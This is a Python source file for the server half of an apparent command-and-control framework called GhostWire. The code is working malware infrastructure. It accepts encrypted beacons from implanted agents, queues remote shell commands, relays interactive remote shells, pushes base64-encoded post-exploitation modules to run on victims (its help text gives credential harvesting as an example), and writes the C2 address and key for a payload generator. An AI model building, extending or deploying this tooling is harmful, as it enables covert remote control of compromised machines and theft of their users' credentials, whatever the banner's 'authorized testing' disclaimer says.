"""
GhostWire C2 Server - Core Server Implementation
================================================

This module contains the core C2 server implementation that handles:
- SSL/TLS encrypted communications with agents
- AES-256-GCM authenticated encryption for additional security
- Agent session management and tracking
- Task queuing and result collection
- Interactive operator CLI with command completion
- Connection multiplexing (beacon vs interactive shell)
- Module discovery and execution

The server operates on a client-server model where:
1. Agents beacon to the server with encrypted data
2. Server processes beacon data and queues tasks
3. Agents retrieve and execute tasks on next beacon
4. Results are returned to server for operator review

Security Features:
- Dual-layer encryption (SSL/TLS + AES-256-GCM)
- Session timeout and cleanup
- Input validation and sanitization
- Secure key management

Architecture:
- C2Server: Main server class handling connections and sessions
- OperatorShell: Interactive CLI for operator commands
- CryptoUtils: Encryption/decryption utilities
- BufferedSocket: Socket wrapper for connection handling
"""
import socket
import threading
import time
import json
import uuid
import struct
import importlib
import readline
import sys
import pkgutil
import os
import ssl
import base64
import select
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import inspect  # <-- Fix: import inspect for getsource

# --- ANSI Color Codes for Terminal Output ---
# These provide colored output for better user experience and readability
RESET, BOLD, RED, GREEN, YELLOW, BLUE, CYAN, MAGENTA = '\033[0m', '\033[1m', '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[36m', '\033[35m'

# --- Crypto Class for AES-256-GCM Encryption ---
class DecryptionError(Exception): 
    """Custom exception for decryption failures"""
    pass

class CryptoUtils:
    """
    Cryptographic utilities for AES-256-GCM authenticated encryption.
    
    This class provides methods for encrypting and decrypting data using
    AES-256-GCM, which provides both confidentiality and authenticity.
    The encryption uses a 12-byte nonce for each operation.
    """
    @staticmethod
    def encrypt(key, data):
        """
        Encrypt data using AES-256-GCM.
        
        Args:
            key: 32-byte AES key
            data: Data to encrypt (bytes)
            
        Returns:
            bytes: Nonce (12 bytes) + encrypted data + authentication tag
        """
        nonce = os.urandom(12)  # Generate random 12-byte nonce
        return nonce + AESGCM(key).encrypt(nonce, data, None)
    
    @staticmethod
    def decrypt(key, data):
        """
        Decrypt data using AES-256-GCM.
        
        Args:
            key: 32-byte AES key
            data: Encrypted data (nonce + ciphertext + tag)
            
        Returns:
            bytes: Decrypted data
            
        Raises:
            DecryptionError: If decryption fails or data is invalid
        """
        if len(data) < 12: 
            raise DecryptionError("Invalid ciphertext - too short")
        try: 
            return AESGCM(key).decrypt(data[:12], data[12:], None)
        except Exception as e: 
            raise DecryptionError("Decryption failed") from e
    
    @staticmethod
    def generate_strong_key(length=32): 
        """Generate a cryptographically strong random key"""
        return os.urandom(length)

# --- C2 Server Class - Main Server Implementation ---
class C2Server:
    """
    Main C2 server class that handles agent communications and session management.
    
    This class is responsible for:
    - Accepting SSL/TLS connections from agents
    - Managing agent sessions and their states
    - Processing encrypted beacons and responses
    - Providing the operator interface
    - Handling connection multiplexing
    """
    SESSION_TIMEOUT = 120  # Seconds before considering a session offline

    class BufferedSocket:
        """
        A wrapper for a socket to allow prepending data to the receive buffer.
        
        This is used to handle cases where initial data has already been read
        from the socket (e.g., during connection type detection) and needs to
        be made available for subsequent reads.
        """
        def __init__(self, sock, initial_buffer=b''):
            self._sock = sock
            self._buffer = initial_buffer

        def recv(self, bufsize):
            """Receive data, prioritizing buffered data first"""
            if self._buffer:
                data = self._buffer[:bufsize]
                self._buffer = self._buffer[bufsize:]
                return data
            return self._sock.recv(bufsize)

        def sendall(self, data):
            """Send all data through the underlying socket"""
            return self._sock.sendall(data)
        
        def close(self):
            """Close the underlying socket"""
            return self._sock.close()
        
        @property
        def _closed(self):
            """Check if the underlying socket is closed"""
            return self._sock._closed

    def __init__(self, host, port, ssl_cert, ssl_key):
        """
        Initialize the C2 server with SSL/TLS support.
        
        Args:
            host: IP address to bind to
            port: Port number to listen on
            ssl_cert: Path to SSL certificate file
            ssl_key: Path to SSL private key file
        """
        self.host, self.port, self.ssl_cert, self.ssl_key = host, port, ssl_cert, ssl_key
        
        # Generate or load the AES encryption key for agent communications
        self.key = self._get_or_create_key()
        
        # Write server state to file for payload generator
        self._write_server_state()
        
        # Initialize session management and threading primitives
        self.sessions, self.lock, self.shutdown_event = {}, threading.Lock(), threading.Event()
        
        # Initialize the operator shell interface
        self.shell_operator = OperatorShell(self)
        
        # Set up SSL context for secure communications
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.ssl_cert, keyfile=self.ssl_key)
        
        # Create and configure the server socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
        sock.bind((self.host, self.port))
        sock.listen(50)  # Allow up to 50 pending connections
        
        # Wrap the socket with SSL/TLS
        self.server = context.wrap_socket(sock, server_side=True)
        print(f'{BOLD}{CYAN}[+] GhostWire C2 Listening on {YELLOW}{self.host}:{self.port}{RESET} (SSL/TLS Enabled)')

    def _get_or_create_key(self):
        """
        Generate or load the AES encryption key for agent communications.
        
        The key is stored in a file and reused across server restarts to maintain
        compatibility with existing agents.
        
        Returns:
            bytes: 32-byte AES key
            
        Raises:
            SystemExit: If key management fails
        """
        key_file = os.path.join(os.path.dirname(__file__), '..', 'ghostwire.key')
        try:
            # Check if key file exists and has correct size (32 bytes)
            if os.path.exists(key_file) and os.path.getsize(key_file) == 32:
                with open(key_file, "rb") as f: 
                    return f.read()
            
            # Generate new key if file doesn't exist or is invalid
            key = CryptoUtils.generate_strong_key()
            with open(key_file, "wb") as f: 
                f.write(key)
            return key
        except Exception as e: 
            print(f"{RED}[-] FATAL: Key management failed: {e}{RESET}")
            sys.exit(1)

    def _write_server_state(self):
        """
        Write server configuration to a JSON file for the payload generator.
        
        This file contains the C2 server IP, port, and base64-encoded AES key
        that will be embedded into generated agent payloads.
        """
        try:
            state = {
                'c2_ip': self.host, 
                'c2_port': self.port, 
                'aes_key_b64': base64.b64encode(self.key).decode()
            }
            with open(os.path.join(os.path.dirname(__file__), '..', 'server_state.json'), 'w') as f: 
                json.dump(state, f, indent=4)
        except Exception: 
            pass  # Silently fail if we can't write the state file

    def send_with_length(self, sock, data): 
        """Send data with a 4-byte length prefix for framing"""
        sock.sendall(struct.pack('>I', len(data)) + data)
    
    def recv_with_length(self, sock):
        """
        Receive data with length prefix for proper framing.
        
        This method handles the length-prefixed protocol used for all
        encrypted communications between agents and the server.
        
        Args:
            sock: Socket to receive from
            
        Returns:
            bytes or None: Received data or None if connection closed
        """
        try:
            # Read the 4-byte length prefix
            raw_len = sock.recv(4)
            if not raw_len: 
                return None
            
            # Unpack the length (big-endian 32-bit integer)
            msg_len = struct.unpack('>I', raw_len)[0]
            
            # Read the complete message
            data = b''
            while len(data) < msg_len:
                more = sock.recv(msg_len - len(data))
                if not more: 
                    return None
                data += more
            return data
        except (socket.error, struct.error): 
            return None

    def handle_connection(self, client_socket, addr):
        """
        Handle incoming connections and determine if they're beacons or interactive shells.
        
        This method implements connection multiplexing by reading initial data
        to determine the connection type:
        - If data starts with "SHELL_INIT:", it's an interactive shell
        - Otherwise, it's a regular agent beacon
        
        Args:
            client_socket: SSL-wrapped socket from the client
            addr: Client address tuple (ip, port)
        """
        initial_data = b''
        try:
            # Set a short timeout to read initial data for connection type detection
            client_socket.settimeout(2.0)
            initial_data = client_socket.recv(1024)
            client_socket.settimeout(None)  # Remove timeout for normal operation

            if not initial_data:
                client_socket.close()
                return

            # Check if this is an interactive shell connection
            if initial_data.strip().startswith(b"SHELL_INIT:"):
                self.shell_operator.handle_interactive_shell_connection(client_socket, initial_data)
            else:
                # This is a regular agent beacon - create buffered socket and handle
                buffered_sock = self.BufferedSocket(client_socket, initial_data)
                self.handle_beacon(buffered_sock, addr)

        except socket.timeout:
            # Connection timed out during initial read
            client_socket.close()
        except (socket.error, ssl.SSLError) as e:
            # Handle SSL errors and connection issues
            if 'timed out' not in str(e).lower():
                self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Connection from {addr[0]} failed SSL handshake or closed abruptly.{RESET}")
            if not client_socket._closed: 
                client_socket.close()
        except Exception as e:
            # Handle any other unexpected errors
            self.shell_operator.print_with_prompt_restore(f"{RED}[-] Error in connection handler: {e}{RESET}")
            if not client_socket._closed: 
                client_socket.close()

    def handle_beacon(self, sock, addr):
        """
        Process an agent beacon - the main communication method for agents.
        
        This method:
        1. Receives and decrypts the beacon data
        2. Updates agent session information
        3. Collects any results from the agent
        4. Sends queued tasks back to the agent
        
        Args:
            sock: BufferedSocket wrapper around the agent connection
            addr: Agent address tuple (ip, port)
        """
        try:
            # Receive and decrypt the beacon data
            encrypted_beacon = self.recv_with_length(sock)
            if not encrypted_beacon: 
                return
            
            beacon = json.loads(CryptoUtils.decrypt(self.key, encrypted_beacon).decode())
            agent_id = beacon.get('id')
            results = beacon.get('results', [])
            
            if not agent_id: 
                return

            # Update session information in a thread-safe manner
            with self.lock:
                if agent_id not in self.sessions:
                    # New agent check-in
                    self.shell_operator.print_with_prompt_restore(f"\n{GREEN}{BOLD}[+] New Agent Check-in: {BLUE}{agent_id}{RESET} from {YELLOW}{addr[0]}{RESET}")
                    self.sessions[agent_id] = {
                        'id': agent_id, 
                        'ip': addr[0], 
                        'online': True, 
                        'last_seen': time.time(), 
                        'tasks': [], 
                        'results': []
                    }
                
                # Update existing session
                session = self.sessions[agent_id]
                session.update({
                    'online': True, 
                    'last_seen': time.time(), 
                    'metadata': beacon.get('metadata', session.get('metadata', {}))
                })
                
                # Process any results from the agent
                if results:
                    self.shell_operator.print_with_prompt_restore(f"{CYAN}[*] Received {len(results)} result(s) from agent {BLUE}{agent_id}{RESET}")
                    session['results'].extend(results)

                # Get tasks to send to the agent and clear the queue
                tasks_to_send = session['tasks']
                session['tasks'] = []

            # Send response with tasks back to the agent
            response = {'tasks': tasks_to_send}
            encrypted_response = CryptoUtils.encrypt(self.key, json.dumps(response).encode())
            self.send_with_length(sock, encrypted_response)

        except DecryptionError:
            # Handle decryption failures (potential scanning or invalid data)
            self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Received invalid/unauthenticated beacon from {addr[0]}. Potential scanning.{RESET}")
        except (json.JSONDecodeError, UnicodeDecodeError):
            # Handle JSON parsing errors
            self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Failed to decode beacon from {addr[0]}.{RESET}")
        except Exception:
            # Silently handle any other errors
            pass
        finally:
            sock.close()

    def run(self):
        """
        Start the C2 server and operator interface.
        
        This method:
        1. Displays the server banner
        2. Starts the connection acceptance loop
        3. Starts the session monitoring thread
        4. Runs the operator CLI
        5. Handles graceful shutdown
        """
        self.shell_operator.print_banner()
        self.start_accept_loop()
        self.start_session_monitor()
        try:
            self.shell_operator.cmdloop()
        except KeyboardInterrupt:
            self.shutdown()

    def start_accept_loop(self):
        """
        Start the main connection acceptance loop in a separate thread.
        
        This loop continuously accepts new SSL/TLS connections and spawns
        handler threads for each connection. It runs with a timeout to
        allow for graceful shutdown.
        """
        def loop():
            self.server.settimeout(1.0)  # 1-second timeout for accept
            while not self.shutdown_event.is_set():
                try:
                    client, addr = self.server.accept()
                    # Spawn a new thread to handle each connection
                    threading.Thread(target=self.handle_connection, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue  # Timeout is expected, continue the loop
                except Exception:
                    if not self.shutdown_event.is_set(): 
                        self.shutdown()
        
        # Start the acceptance loop in a daemon thread
        threading.Thread(target=loop, daemon=True).start()

    def start_session_monitor(self):
        """
        Start the session monitoring thread that cleans up offline sessions.
        
        This thread periodically checks for sessions that have exceeded the
        timeout period and marks them as offline.
        """
        def monitor():
            while not self.shutdown_event.is_set():
                time.sleep(30)  # Check every 30 seconds
                current_time = time.time()
                
                with self.lock:
                    for agent_id, session in list(self.sessions.items()):
                        if current_time - session['last_seen'] > self.SESSION_TIMEOUT:
                            if session['online']:
                                session['online'] = False
                                self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Agent {BLUE}{agent_id}{RESET} marked as offline.{RESET}")
        
        # Start the monitoring thread
        threading.Thread(target=monitor, daemon=True).start()

    def shutdown(self):
        """
        Gracefully shutdown the C2 server.
        
        This method:
        1. Sets the shutdown event to stop all threads
        2. Closes the server socket
        3. Exits the application
        """
        print(f"\n{RED}[!] Shutting down GhostWire C2 server...{RESET}")
        self.shutdown_event.set()
        self.server.close()
        sys.exit(0)

# --- Operator Shell Class - Interactive CLI Interface ---
class OperatorShell:
    """
    Interactive command-line interface for the C2 operator.
    
    This class provides:
    - Command completion and history
    - Session management commands
    - Task execution and result viewing
    - Module discovery and execution
    - Interactive shell handling
    """
    PROMPT_STR, COMMANDS = "ghostwire", ['sessions', 'shell', 'interactive_shell', 'info', 'results', 'module', 'modules', 'kill', 'generate', 'help', '?', 'exit', 'quit', 'clear']
    PROMPT = f'{BOLD}{MAGENTA}{PROMPT_STR}> {RESET}'

    def __init__(self, server):
        """Initialize the operator shell with reference to the C2 server"""
        self.server = server
        self.discover_modules()  # Discover available post-exploitation modules

    def print_with_prompt_restore(self, msg):
        """
        Print a message and restore the command prompt.
        
        This is used to display messages from background threads while
        maintaining the interactive prompt.
        """
        print(f"\n{msg}")
        print(self.PROMPT, end='', flush=True)

    def completer(self, text, state):
        """
        Command completion function for the readline interface.
        
        This provides tab completion for commands and agent IDs.
        
        Args:
            text: Current text being typed
            state: Completion state (0 for first match, 1 for second, etc.)
            
        Returns:
            str or None: Completion suggestion or None if no more matches
        """
        options = [i for i in self.COMMANDS if i.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def cmdloop(self):
        """
        Main command loop for the operator interface.
        
        This method:
        1. Sets up readline for command completion and history
        2. Displays the command prompt
        3. Processes user input and executes commands
        4. Handles graceful exit
        """
        readline.parse_and_bind("tab: complete")
        readline.set_completer(self.completer)
        
        while True:
            try:
                cmd = input(self.PROMPT).strip()
                if cmd:
                    self.handle_command(cmd)
            except (EOFError, KeyboardInterrupt):
                print(f"\n{RED}[!] Exiting...{RESET}")
                break

    def discover_modules(self):
        """
        Discover available post-exploitation modules in the modules directory.
        
        This method scans the modules directory for Python files and imports
        them to make their classes available for execution.
        """
        self.modules = {}
        modules_dir = os.path.join(os.path.dirname(__file__), '..', 'modules')
        
        try:
            for _, name, _ in pkgutil.iter_modules([modules_dir]):
                if name != '__init__':
                    try:
                        module = importlib.import_module(f'modules.{name}')
                        # Find the main class in the module (assumes one class per module)
                        for attr_name in dir(module):
                            attr = getattr(module, attr_name)
                            if isinstance(attr, type) and hasattr(attr, 'run_remote'):
                                self.modules[name] = attr
                                break
                    except Exception:
                        continue
        except Exception:
            pass

    def handle_command(self, cmd):
        """
        Process and execute operator commands.
        
        This method parses the command line and routes to appropriate handlers
        for different command types.
        
        Args:
            cmd: Raw command string from user input
        """
        parts = cmd.split()
        if not parts:
            return
        
        command = parts[0].lower()
        
        if command in ['sessions', 's']:
            self.list_sessions()
        elif command in ['shell']:
            if len(parts) >= 3:
                self.run_simple_shell(parts[1], ' '.join(parts[2:]))
            else:
                print(f"{RED}[-] Usage: shell <agent_id> <command>{RESET}")
        elif command in ['interactive_shell', 'is']:
            if len(parts) >= 2:
                self.queue_task(parts[1], {'type': 'interactive_shell'}, "Interactive Shell")
            else:
                print(f"{RED}[-] Usage: interactive_shell <agent_id>{RESET}")
        elif command in ['info']:
            if len(parts) >= 2:
                self.show_info(parts[1])
            else:
                print(f"{RED}[-] Usage: info <agent_id>{RESET}")
        elif command in ['results', 'r']:
            if len(parts) >= 2:
                self.show_results(parts[1])
            else:
                print(f"{RED}[-] Usage: results <agent_id>{RESET}")
        elif command in ['module']:
            if len(parts) >= 2:
                self.run_module(' '.join(parts[1:]))
            else:
                print(f"{RED}[-] Usage: module <agent_id> <module_name> [args]{RESET}")
        elif command in ['modules', 'm']:
            self.print_modules()
        elif command in ['kill']:
            if len(parts) >= 2:
                self.queue_task(parts[1], {'type': 'kill'}, "Kill Agent")
            else:
                print(f"{RED}[-] Usage: kill <agent_id>{RESET}")
        elif command in ['generate', 'g']:
            print(f"{YELLOW}[!] Use 'python3 payload_generator.py' in a separate terminal.{RESET}")
        elif command in ['help', '?']:
            self.print_help()
        elif command in ['exit', 'quit']:
            print(f"{RED}[!] Exiting...{RESET}")
            sys.exit(0)
        elif command in ['clear']:
            os.system('clear' if os.name == 'posix' else 'cls')
        else:
            print(f"{RED}[-] Unknown command: {command}{RESET}")
            print(f"{YELLOW}[*] Type 'help' for available commands.{RESET}")

    def handle_interactive_shell_connection(self, shell_socket, initial_data):
        """
        Handle an interactive shell connection from an agent.
        
        This method sets up a full PTY shell session between the operator
        and the target system through the agent.
        
        Args:
            shell_socket: SSL-wrapped socket for the shell connection
            initial_data: Initial data containing agent ID
        """
        try:
            # Extract agent ID from initial data
            agent_id = initial_data.decode().split(':')[1].strip()
            print(f"\n{GREEN}{BOLD}[+] Interactive shell session started with agent {BLUE}{agent_id}{RESET}")
            print(f"{YELLOW}[*] Type 'exit' to end the shell session.{RESET}\n")
            
            # Set up non-blocking I/O for the shell
            shell_socket.setblocking(False)
            
            # Main shell loop
            while True:
                # Check if we can read from the shell
                ready, _, _ = select.select([shell_socket], [], [], 0.1)
                if ready:
                    data = shell_socket.recv(1024)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                
                # Check if we can read from stdin (user input)
                if select.select([sys.stdin], [], [], 0)[0]:
                    user_input = sys.stdin.readline()
                    if user_input.strip() == 'exit':
                        break
                    shell_socket.sendall(user_input.encode())
                    
        except Exception as e:
            print(f"\n{RED}[-] Interactive shell error: {e}{RESET}")
        finally:
            shell_socket.close()
            print(f"\n{YELLOW}[*] Interactive shell session ended.{RESET}")
            print(self.PROMPT, end='', flush=True)

    def list_sessions(self):
        """Display all active and offline agent sessions"""
        with self.server.lock:
            if not self.server.sessions:
                print(f"{YELLOW}[!] No agent sessions found.{RESET}")
                return
            
            print(f"\n{BOLD}{CYAN}Active Agent Sessions:{RESET}")
            print(f"{'ID':<36} {'IP':<15} {'Status':<8} {'Last Seen':<20}")
            print("-" * 80)
            
            for agent_id, session in self.server.sessions.items():
                status = f"{GREEN}ONLINE{RESET}" if session['online'] else f"{RED}OFFLINE{RESET}"
                last_seen = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(session['last_seen']))
                print(f"{agent_id:<36} {session['ip']:<15} {status:<8} {last_seen:<20}")

    def show_info(self, agent_id):
        """
        Display detailed information about a specific agent.
        
        Args:
            agent_id: The agent ID to show information for
        """
        with self.server.lock:
            if agent_id not in self.server.sessions:
                print(f"{RED}[-] Agent {agent_id} not found.{RESET}")
                return
            
            session = self.server.sessions[agent_id]
            print(f"\n{BOLD}{CYAN}Agent Information:{RESET}")
            print(f"  ID: {session['id']}")
            print(f"  IP: {session['ip']}")
            print(f"  Status: {'Online' if session['online'] else 'Offline'}")
            print(f"  Last Seen: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(session['last_seen']))}")
            
            if 'metadata' in session:
                metadata = session['metadata']
                print(f"  Hostname: {metadata.get('hostname', 'N/A')}")
                print(f"  User: {metadata.get('user', 'N/A')}")
                print(f"  Platform: {metadata.get('platform', 'N/A')}")
                print(f"  PID: {metadata.get('pid', 'N/A')}")

    def show_results(self, agent_id):
        """
        Display results from a specific agent.
        
        Args:
            agent_id: The agent ID to show results for
        """
        with self.server.lock:
            if agent_id not in self.server.sessions:
                print(f"{RED}[-] Agent {agent_id} not found.{RESET}")
                return
            
            session = self.server.sessions[agent_id]
            if not session['results']:
                print(f"{YELLOW}[!] No results available for agent {agent_id}.{RESET}")
                return
            
            print(f"\n{BOLD}{CYAN}Results from Agent {agent_id}:{RESET}")
            for i, result in enumerate(session['results'], 1):
                print(f"\n--- Result {i} ---")
                print(f"Task ID: {result.get('task_id', 'N/A')}")
                print(f"Type: {result.get('type', 'N/A')}")
                print(f"Output:\n{result.get('output', 'No output')}")

    def run_simple_shell(self, agent_id, command):
        """
        Execute a shell command on a specific agent.
        
        Args:
            agent_id: The agent ID to execute the command on
            command: The shell command to execute
        """
        self.queue_task(agent_id, {'type': 'shell', 'command': command}, f"Shell: {command}")

    def run_module(self, args):
        """
        Execute a post-exploitation module on a specific agent.
        Args:
            args: agent_id, module_name, and optional arguments
        """
        parts = args.split()
        if len(parts) < 2:
            print(f"{RED}[-] Usage: module <agent_id> <module_name> [args]{RESET}")
            return
        agent_id = parts[0]
        module_name = parts[1]
        module_args = ' '.join(parts[2:]) if len(parts) > 2 else ""
        if module_name not in self.modules:
            print(f"{RED}[-] Module '{module_name}' not found.{RESET}")
            return
        module_class = self.modules[module_name]
        try:
            module_code = inspect.getsource(module_class)
            encoded_code = base64.b64encode(module_code.encode()).decode()
            self.queue_task(agent_id, {
                'type': 'module',
                'module_code': encoded_code,
                'args': module_args
            }, f"Module: {module_name}")
        except Exception as e:
            print(f"{RED}[-] Failed to execute module: {e}{RESET}")

    def print_modules(self):
        """Display all available post-exploitation modules"""
        if not self.modules:
            print(f"{YELLOW}[!] No modules found.{RESET}")
            return
        
        print(f"\n{BOLD}{CYAN}Available Modules:{RESET}")
        for name, module_class in self.modules.items():
            doc = module_class.__doc__ or "No description available"
            print(f"  {name:<15} - {doc.split('.')[0]}")

    def queue_task(self, agent_id, task_dict, task_name="Task"):
        """
        Queue a task for execution on a specific agent.
        
        Args:
            agent_id: The agent ID to queue the task for
            task_dict: Task dictionary containing type and parameters
            task_name: Human-readable name for the task
        """
        with self.server.lock:
            if agent_id not in self.server.sessions:
                print(f"{RED}[-] Agent {agent_id} not found.{RESET}")
                return
            
            if not self.server.sessions[agent_id]['online']:
                print(f"{YELLOW}[!] Agent {agent_id} is offline. Task will be queued for when it comes online.{RESET}")
            
            # Add task ID for tracking
            task_dict['task_id'] = str(uuid.uuid4())
            self.server.sessions[agent_id]['tasks'].append(task_dict)
            print(f"{GREEN}[+] Queued {task_name} for agent {agent_id}{RESET}")

    def print_help(self):
        """Display help information for all available commands"""
        help_text = f"""
{BOLD}{CYAN}GhostWire C2 Framework - Available Commands:{RESET}

{BOLD}Session Management:{RESET}
  sessions, s                    - List all agent sessions
  info <agent_id>               - Show detailed agent information
  results, r <agent_id>         - Show results from an agent

{BOLD}Command Execution:{RESET}
  shell <agent_id> <command>    - Execute shell command on agent
  interactive_shell, is <agent_id> - Start interactive PTY shell

{BOLD}Module System:{RESET}
  modules, m                    - List available post-exploitation modules
  module <agent_id> <module_name> [args]   - Execute module on a specific agent

{BOLD}Agent Control:{RESET}
  kill <agent_id>               - Terminate an agent

{BOLD}Utility:{RESET}
  generate, g                   - Generate agent payload (use separate terminal)
  clear                         - Clear the terminal
  help, ?                       - Show this help message
  exit, quit                    - Exit the C2 server

{BOLD}Examples:{RESET}
  shell abc123 whoami           - Run 'whoami' on agent abc123
  module abc123 creds           - Run credential harvesting on agent abc123
  interactive_shell abc123      - Start interactive shell with agent abc123
"""
        print(help_text)

    def print_banner(self):
        """Display the GhostWire C2 framework banner"""
        banner = f"""
{BOLD}{MAGENTA}
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗    ██╗██╗██████╗ ██████╗ ███████╗
██╔════╝ ██║  ██║██╔════╝ ██╔════╝╚══██╔══╝██║    ██║██║██╔══██╗██╔══██╗██╔════╝
██║  ███╗███████║██║  ███╗███████╗   ██║   ██║ █╗ ██║██║██████╔╝██████╔╝█████╗  
██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██║███╗██║██║██╔══██╗██╔══██╗██╔══╝  
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ╚███╔███╔╝██║██║  ██║██║  ██║███████╗
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
{RESET}
{BOLD}{CYAN}Command & Control Framework - v1.0{RESET}
{BOLD}{YELLOW}For authorized testing and educational purposes only{RESET}

Type 'help' for available commands.
"""
        print(banner)